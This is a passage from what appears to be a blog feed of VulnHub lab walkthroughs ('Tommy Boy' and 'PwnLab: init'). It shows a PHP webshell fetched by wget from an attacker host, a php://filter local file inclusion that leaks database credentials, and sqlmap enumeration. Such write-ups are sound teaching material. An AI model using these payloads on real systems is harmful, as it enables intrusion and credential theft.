</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cp callahanbak.bak /var/www/html/index.html
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>ls -l /var/www/html/index.html
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior <span class="m">307</span> Sep  <span class="m">5</span> 07:16 /var/www/html/index.html
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cat /var/www/html/index.html
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;title&gt;Welcome to Callahan Auto&lt;/title&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;H1&gt;&lt;center&gt;Welcome to Callahan Auto!&lt;/center&gt;&lt;/H1&gt;
</span><span class='line'>&lt;font <span class="nv">color</span><span class="o">=</span><span class="s2">&quot;0000ff&quot;</span>&gt;&lt;H2&gt;&lt;center&gt;SYSTEM STATUS: ONLINE&lt;/center&gt;&lt;/H2&gt;&lt;/font&gt;
</span><span class='line'>&lt;H3&gt;We<span class="err">&#39;</span>re happy to be serving all your brakepad needs.&lt;/H3&gt;
</span><span class='line'>&lt;p&gt;
</span><span class='line'>&lt;center&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;ca.jpeg&quot;</span>&gt;&lt;/center&gt;
</span><span class='line'>&lt;p&gt;
</span><span class='line'>&lt;p&gt;
</span><span class='line'>&lt;/html&gt;
</span><span class='line'>&lt;!----&gt;
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/12.png"></p>

<p>By doing enumeration and found the following world-writable folders:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:/var/www/html<span class="nv">$ </span>find / -perm -222 -type d 2&gt;/dev/null
</span><span class='line'>/var/lib/php/sessions
</span><span class='line'>/var/crash
</span><span class='line'>/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads
</span><span class='line'>/var/tmp
</span><span class='line'>/dev/mqueue
</span><span class='line'>/dev/shm
</span><span class='line'>/run/lock
</span><span class='line'>/tmp
</span><span class='line'>/tmp/.XIM-unix
</span><span class='line'>/tmp/.Test-unix
</span><span class='line'>/tmp/.font-unix
</span><span class='line'>/tmp/.ICE-unix
</span><span class='line'>/tmp/.X11-unix
</span></code></pre></td></tr></table></div></figure>


<p>Now upload single-line php shell to the writable folder <font color="red"><code>/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads</code></font> and name it to <code>sh.php</code></p>

<p>The PHP shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/var/www/html# cat shell.php
</span><span class='line'>&lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span> ?&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Upload it to target:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads<span class="nv">$ </span>wget http://10.1.1.132/shell.php -O sh.php
</span><span class='line'>--2016-09-05 07:38:35--  http://10.1.1.132/shell.php
</span><span class='line'>Connecting to 10.1.1.132:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... <span class="m">200</span> OK
</span><span class='line'>Length: 31
</span><span class='line'>Saving to: ‘sh.php’
</span><span class='line'>
</span><span class='line'>sh.php                                              100%<span class="o">[================================================================================================================</span>&gt;<span class="o">]</span>      <span class="m">31</span>  --.-KB/s    in 0s
</span><span class='line'>
</span><span class='line'>2016-09-05 07:38:35 <span class="o">(</span>6.03 MB/s<span class="o">)</span> - ‘sh.php’ saved <span class="o">[</span>31/31<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads<span class="nv">$ </span>ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxrwxrwx <span class="m">2</span> www-data       www-data       <span class="m">4096</span> Sep  <span class="m">5</span> 07:38 .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> www-data       www-data       <span class="m">4096</span> Jul <span class="m">15</span> 12:47 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root           root            <span class="m">243</span> Jul <span class="m">15</span> 12:23 .htaccess
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root           root            <span class="m">447</span> Jul <span class="m">15</span> 12:32 index.html
</span><span class='line'>-rw-rw-r-- <span class="m">1</span> bigtommysenior bigtommysenior   <span class="m">31</span> Aug <span class="m">24</span> 06:43 sh.php
</span></code></pre></td></tr></table></div></figure>


<h3>The 5th Flag</h3>

<p>Found the 5th flag file:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/13.png"></p>

<p>The 5th flag is <font color="red">Buttcrack</font></p>

<p>Ok now blob all the flag together to make the password: <font color="red"><code>B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack</code></font></p>

<p>Great, now to open the <code>LOOT.ZIP</code> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>unzip LOOT.ZIP
</span><span class='line'>Archive:  LOOT.ZIP
</span><span class='line'><span class="o">[</span>LOOT.ZIP<span class="o">]</span> THE-END.txt password:
</span><span class='line'>  inflating: THE-END.txt
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>ls
</span><span class='line'>callahanbak.bak  el-flag-numero-quatro.txt  LOOT.ZIP  THE-END.txt
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cat THE-END.txt
</span><span class='line'>YOU CAME.
</span><span class='line'>YOU SAW.
</span><span class='line'>YOU PWNED.
</span><span class='line'>
</span><span class='line'>Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.
</span><span class='line'>
</span><span class='line'>GREAT WORK!
</span><span class='line'>
</span><span class='line'>I<span class="s1">&#39;d love to know that you finished this VM, and/or get your suggestions on how to make the next </span>
</span><span class='line'><span class="s1">one better.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Please shoot me a note at 7ms @ 7ms.us with subject line &quot;Here comes the meat wagon!&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Or, get in touch with me other ways:</span>
</span><span class='line'>
</span><span class='line'><span class="s1">* Twitter: @7MinSec</span>
</span><span class='line'><span class="s1">* IRC (Freenode): #vulnhub (username is braimee)</span>
</span><span class='line'>
</span><span class='line'><span class="s1">Lastly, please don&#39;</span>t forget to check out www.7ms.us and subscribe to the podcast at
</span><span class='line'>bit.ly/7minsec
</span><span class='line'>
</span><span class='line'>&lt;/shamelessplugs&gt;
</span><span class='line'>
</span><span class='line'>Thanks and have a blessed week!
</span><span class='line'>
</span><span class='line'>-Brian Johnson
</span><span class='line'><span class="m">7</span> Minute Security
</span></code></pre></td></tr></table></div></figure>


<p>Hooooo, finally, Got it!!</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] PwnLab: init]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/29/vulnhub-pwnlab-init/"/>
    <updated>2016-08-29T20:46:38+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/29/vulnhub-pwnlab-init</id>
    <content type="html"><![CDATA[<p>&ldquo;Wellcome to \"PwnLab: init\&rdquo;, my first Boot2Root virtual machine. Meant to be easy, I hope you enjoy it and maybe learn something. The purpose of this CTF is to get root and read de flag.&ldquo; &ndash; <a href="https://www.vulnhub.com/author/claor,331/">Claor</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/pwnlab-init,158/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.132/24</em>)</p>

<p>Target: PwnLab: init (<em>10.1.1.140/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Local File Inclusion vulnerability</li>
<li>Dump DB tables and crack user credentials</li>
<li>Login and upload webshell/Reverse PHP Shell</li>
<li>Bypass File Extension limit</li>
<li>Exploit <code>setuid</code> sticky bit set file/program to privilege escape</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Local File Inclusion vulnerability found and exploited to discover MySQL login information</li>
<li>Login to MySQL DB and download user table to obtain user/pass</li>
<li>Login to Web application as privilege user and upload webshell/PHP reverse shell</li>
<li>Enumeration after get into the target server and escape to different users</li>
<li>Exploit <code>setuid</code> stikcy bit set program to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>http://www.nta-monitor.com/tools/arp-scan/<span class="o">)</span>
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.140    00:0c:29:11:ce:27   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:ee:0a:4f   VMware, Inc.
</span><span class='line'>
</span><span class='line'><span class="m">4</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.312 seconds <span class="o">(</span>110.73 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure>


<p><code>10.1.1.140</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.140/32 --rate<span class="o">=</span>10000
</span><span class='line'>
</span><span class='line'>Starting masscan 1.0.3 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2016-08-22 13:17:05 GMT
</span><span class='line'> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 111/tcp on 10.1.1.140
</span><span class='line'>Discovered open port 3306/tcp on 10.1.1.140
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.140
</span><span class='line'>Discovered open port 59968/tcp on 10.1.1.140
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.140
</span><span class='line'>Host is up <span class="o">(</span>0.00028s latency<span class="o">)</span>.
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
</span><span class='line'><span class="p">|</span>_http-title: PwnLab Intranet Image Hosting
</span><span class='line'>111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
</span><span class='line'><span class="p">|</span> rpcinfo:
</span><span class='line'><span class="p">|</span>   program version   port/proto  service
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp  rpcbind
</span><span class='line'><span class="p">|</span>   <span class="m">100024</span>  <span class="m">1</span>          35271/udp  status
</span><span class='line'><span class="p">|</span>_  <span class="m">100024</span>  <span class="m">1</span>          59968/tcp  status
</span><span class='line'>3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
</span><span class='line'><span class="p">|</span> mysql-info:
</span><span class='line'><span class="p">|</span>   Protocol: 53
</span><span class='line'><span class="p">|</span>   Version: .5.47-0+deb8u1
</span><span class='line'><span class="p">|</span>   Thread ID: 38
</span><span class='line'><span class="p">|</span>   Capabilities flags: 63487
</span><span class='line'><span class="p">|</span>   Some Capabilities: ODBCClient, LongPassword, SupportsCompression, Speaks41ProtocolOld, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongColumnFlag, FoundRows, SupportsTransactions, Support41Auth
</span><span class='line'><span class="p">|</span>   Status: Autocommit
</span><span class='line'><span class="p">|</span>_  Salt: <span class="p">&amp;</span>AVi2YKInpe-Lv1.3R<span class="p">&amp;</span>d
</span><span class='line'>59968/tcp open  status  <span class="m">1</span> <span class="o">(</span>RPC <span class="c">#100024)</span>
</span><span class='line'>MAC Address: 00:0C:29:11:CE:27 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span><span class='line'>OS details: Linux 3.2 - 4.4
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Based on the result of NMAP scan, firstly, I found port 80 and 3306 is open.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.140
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET IP address found in the <span class="s1">&#39;location&#39;</span> header. The IP is <span class="s2">&quot;127.0.1.1&quot;</span>.
</span><span class='line'>+ OSVDB-630: GET IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is <span class="s2">&quot;http://127.0.1.1/images/&quot;</span>.
</span><span class='line'>+ SZYEPUYV Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
</span><span class='line'>+ GET Cookie PHPSESSID created without the httponly flag
</span><span class='line'>+ GET /config.php: PHP Config file may contain database IDs and passwords.
</span><span class='line'>+ OSVDB-3268: GET /images/: Directory indexing found.
</span><span class='line'>+ OSVDB-3268: GET /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
</span><span class='line'>+ OSVDB-3233: GET /icons/README: Apache default file found.
</span><span class='line'>+ GET /login.php: Admin login page/section found.
</span></code></pre></td></tr></table></div></figure>


<p>From the nikto scan, I noticed that <code>/login.php</code> is found which could be the Admin login page, and <code>/images/</code> directory indexing found, and last but not least, <code>/config.php</code> is found which may contain database IDs and passowrds.</p>

<p>Then I use firefox to open the target website and have a look around.</p>

<p>I was hanging on here for quite a while, after trying brute force the login, tring SQL injection and trying brute force directory but all failed&hellip; I finally found a <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/" title="Local File Inclusion with PHP wrappers">LFI vulnerability</a> on the <code>page</code> parameter.</p>

<p>by exploiting this LFI vulnerability and based on the previous Nickto scan result (<code>config.php</code> is found and may contain DB login):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# curl http://10.1.1.140/?page<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>config
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;
</span><span class='line'>&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;
</span><span class='line'>&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;center&gt;
</span><span class='line'>&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;images/pwnlab.png&quot;</span>&gt;&lt;br /&gt;
</span><span class='line'><span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;/&quot;</span>&gt;Home&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=login&quot;</span>&gt;Login&lt;/a&gt; <span class="o">]</span> <span class="o">[</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;?page=upload&quot;</span>&gt;Upload&lt;/a&gt; <span class="o">]</span>
</span><span class='line'>&lt;hr/&gt;&lt;br/&gt;
</span><span class='line'>PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+&lt;/center&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;root@kali:~/myExercises/pwnlab_init#
</span><span class='line'>root@kali:~/myExercises/pwnlab_init# <span class="nb">echo</span> <span class="s2">&quot;PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkg0dSVRSl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+&quot;</span> <span class="p">|</span> base64 --decode
</span><span class='line'>&lt;?php
</span><span class='line'><span class="nv">$server</span>     <span class="o">=</span> <span class="s2">&quot;localhost&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="s2">&quot;root&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="s2">&quot;H4u%QJ_H99&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$database</span> <span class="o">=</span> <span class="s2">&quot;Users&quot;</span><span class="p">;</span>
</span><span class='line'>?&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Cool, now I got the database ROOT login (<font color="red"><code>root/H4u%QJ_H99</code></font>) and the DB name is <font color="red"><code>Users</code></font>, then I use <code>sqlmap</code> to check target DB</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# sqlmap -d <span class="s1">&#39;mysql://root:H4u%QJ_H99@10.1.1.140:3306/Users&#39;</span> --tables -D Users
</span><span class='line'>         _
</span><span class='line'> ___ ___<span class="p">|</span> <span class="p">|</span>_____ ___ ___  <span class="o">{</span>1.0.8.2#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>_ -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="s1">&#39;| . |</span>
</span><span class='line'><span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
</span><span class='line'><span class="s1">      |_|           |_|   http://sqlmap.org</span>
</span><span class='line'>
</span><span class='line'><span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> starting at 20:02:54
</span><span class='line'>
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 established
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span>...
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching tables <span class="k">for</span> database: <span class="s1">&#39;Users&#39;</span>
</span><span class='line'>Database: Users
</span><span class='line'><span class="o">[</span><span class="m">1</span> table<span class="o">]</span>
</span><span class='line'>+-------+
</span><span class='line'><span class="p">|</span> users <span class="p">|</span>
</span><span class='line'>+-------+
</span><span class='line'>
</span><span class='line'><span class="o">[</span>20:02:54<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.140:3306 closed
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> shutting down at 20:02:54
</span></code></pre></td></tr></table></div></figure>


<p>Got the table name is <code>users</code>, then dump the table:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
